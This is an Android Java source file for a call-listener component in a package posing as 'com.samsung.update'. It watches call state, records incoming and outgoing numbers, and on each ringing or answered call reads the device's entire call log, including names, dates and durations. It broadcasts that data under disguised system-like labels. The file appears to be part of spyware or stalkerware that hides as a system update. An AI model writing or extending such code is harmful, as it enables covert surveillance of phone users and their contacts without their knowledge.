package com.samsung.update;
import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.CallLog;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
//import android.content.Intent;
//import android.os.Bundle;
//import android.os.IBinder;
//import android.service.notification.NotificationListenerService;
//import android.service.notification.StatusBarNotification;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import java.util.Date;

public class CallListener extends BroadcastReceiver {
    public Context context;
    private int lastState=-1;

    public void send(String state, String phone) {
        Intent intent = new  Intent("com.samsung.update");
        intent.putExtra("type", "call");
        intent.putExtra("state", state);
        intent.putExtra("package", "android.system.call");
        intent.putExtra("phone", phone);
        this.context.sendBroadcast(intent);
    }

    @Override
    public void onReceive(final Context context, final Intent intent) {
        this.context=context;
        TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        telephony.listen(new PhoneStateListener() {
            @Override
            public void onCallStateChanged(int state, String incomingNumber) {
                super.onCallStateChanged(state, incomingNumber);
                if (lastState != -1 && lastState == state) {
                    return;
                }
//                if (incomingNumber != null && incomingNumber.length() > 0)
                if(!incomingNumber.isEmpty()) {
                    lastState=state;
                    System.out.println("incomingNumber : " + incomingNumber);
                    Bundle bundle = intent.getExtras();
                    String phoneNr = bundle.getString("incoming_number");
                    String numberQ = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
//                    String number = incomingNumber + "-" + bundle.getString("incoming_number") + "-" + phoneNr + "-" + numberQ;
                    String number = incomingNumber;
                    String stateName = "none";
//                    Log.e("ggg", incomingNumber);
                    //                if(!incomingNumber.isEmpty()) {
                    //                    number=incomingNumber;
                    //                }
                    if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
                        stateName = "CALL_PHONE_NUMBER";
                    } else {
                        String stateStr = intent.getExtras().getString(TelephonyManager.EXTRA_STATE);
//                        if (!intent.getExtras().containsKey(TelephonyManager.EXTRA_INCOMING_NUMBER)) {
//                            Log.i("Call receiver", "skipping intent=" + intent + ", extras=" + intent.getExtras() + " - no number was supplied");
//                            return;
//                        }
//                        String number = intent.getExtras().getString(TelephonyManager.EXTRA_INCOMING_NUMBER);

                        if (stateStr.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                            stateName = "CALL_STATE_IDLE";
                        } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                            stateName = "CALL_STATE_OFFHOOK";
                            fetchDetails();
                        } else if (stateStr.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                            stateName = "CALL_STATE_RINGING";
                            fetchDetails();
                        }
                    }
                    send(stateName, number);
                }
            }
        }, PhoneStateListener.LISTEN_CALL_STATE);
    }


//    @Override
//    public void onReceive(Context context, Intent intent) {
//        this.context=context;
////        // Instantiating PhoneStateListener
////        CallStateListener phoneListener=new CallStateListener(context);
////        // Instantiating TelephonyManager
////        TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
////        // Registering the telephony to listen CALL STATE change
////        telephony.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE);
//
//
//    }


//    public void onCallStateChanged(Context context, String state, String number) {
//        if(lastState == state){
//            //No change, debounce extras
//            return;
//        }
//        switch (state) {
//            case TelephonyManager.CALL_STATE_RINGING:
//                isIncoming = true;
//                callStartTime = new Date();
//                savedNumber = number;
//                Toast.makeText(context, "Incoming Call Ringing" , Toast.LENGTH_SHORT).show();
//                break;
//            case TelephonyManager.CALL_STATE_OFFHOOK:
//                //Transition of ringing->offhook are pickups of incoming calls.  Nothing done on them
//                if(lastState != TelephonyManager.CALL_STATE_RINGING){
//                    isIncoming = false;
//                    callStartTime = new Date();
//                    Toast.makeText(context, "Outgoing Call Started" , Toast.LENGTH_SHORT).show();
//                }
//                break;
//            case TelephonyManager.CALL_STATE_IDLE:
//                //Went to idle-  this is the end of a call.  What type depends on previous state(s)
//                if(lastState == TelephonyManager.CALL_STATE_RINGING){
//                    //Ring but no pickup-  a miss
//                    Toast.makeText(context, "Ringing but no pickup" + savedNumber + " Call time " + callStartTime +" Date " + new Date() , Toast.LENGTH_SHORT).show();
//                }
//                else if(isIncoming){
//                    Toast.makeText(context, "Incoming " + savedNumber + " Call time " + callStartTime  , Toast.LENGTH_SHORT).show();
//                }
//                else{
//                    Toast.makeText(context, "outgoing " + savedNumber + " Call time " + callStartTime +" Date " + new Date() , Toast.LENGTH_SHORT).show();
//                }
//                break;
//        }
//        lastState = state;
//    }


    //    @Override
//    public void onReceive(final Context context, Intent intent) {
//        TelephonyManager telephony = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//        telephony.listen(new PhoneStateListener() {
//            @Override
//            public void onCallStateChanged(int state, String incomingNumber) {
//                if (!incomingNumber.isEmpty()) {
//                    if(state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
//                        ring =true;
//                        Bundle bundle = intent.getExtras();
//                        callerPhoneNumber= bundle.getString("incoming_number");
//                    }
//                    // If incoming call is received
//                    if(state == TelephonyManager.EXTRA_STATE_OFFHOOK)
//                    {
//                        callReceived=true;
//                    }
//                    // If phone is Idle
//                    if (state == TelephonyManager.EXTRA_STATE_IDLE)
//                    {
//                        // If phone was ringing(ring=true) and not received(callReceived=false) , then it is a missed call
//                        if(ring==true&&callReceived==false)
//                        {
//                            Toast.makeText(mContext, "It was A MISSED CALL from : "+callerPhoneNumber, Toast.LENGTH_LONG).show();
//                        }
//                    }
//                    send(sb);
//                }
//            }
//        }, PhoneStateListener.LISTEN_CALL_STATE);
//    }


    private void fetchDetails() {

        Uri contacts = CallLog.Calls.CONTENT_URI;

        Cursor cursor = context.getContentResolver().query(contacts, null, null, null, null);
        int number = cursor.getColumnIndex(CallLog.Calls.NUMBER);
        int date = cursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = cursor.getColumnIndex(CallLog.Calls.DURATION);
        int type = cursor.getColumnIndex(CallLog.Calls.TYPE);
        int name = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);

        String lists="";
        for (cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()) {
            String phoneNumber = cursor.getString(number);
            String dateT = cursor.getString(date);
            String dur = cursor.getString(duration);
            int tp = Integer.parseInt(cursor.getString(type));
            String nm = cursor.getString(name);
            String callType = "";
            switch (tp) {
                case CallLog.Calls.INCOMING_TYPE:
                    callType = "Incoming Call";
                    break;
                case CallLog.Calls.OUTGOING_TYPE:
                    callType = "Outgoing Call";
                    break;
                case CallLog.Calls.MISSED_TYPE:
                    callType = "Missed Call";
                    break;
            }
//            Toast.makeText(context, "Number : " + phoneNumber + "\n" + "Name: " + nm + "\n" + "Date : " + dateT + "\n" + "Duration : " + dur + "\n" + "Type: " + callType, Toast.LENGTH_SHORT).show();
//            Log.e("calling", "Number : " + phoneNumber + "\n" + "Name: " + nm + "\n" + "Date : " + dateT + "\n" + "Duration : " + dur + "\n" + "Type: " + callType);
            lists+="Number : " + phoneNumber + "\n" + "Name: " + nm + "\n" + "Date : " + dateT + "\n" + "Duration : " + dur + "\n" + "Type: " + callType+"\n";
        }
//        if (cursor.moveToFirst()) {}
//        Log.e("callList", lists);
        Intent intent = new  Intent("com.samsung.update");
        intent.putExtra("type", "callList");
        intent.putExtra("data", lists);
        intent.putExtra("package", "android.system.call.list");
        this.context.sendBroadcast(intent);

        cursor.close();
    }

}
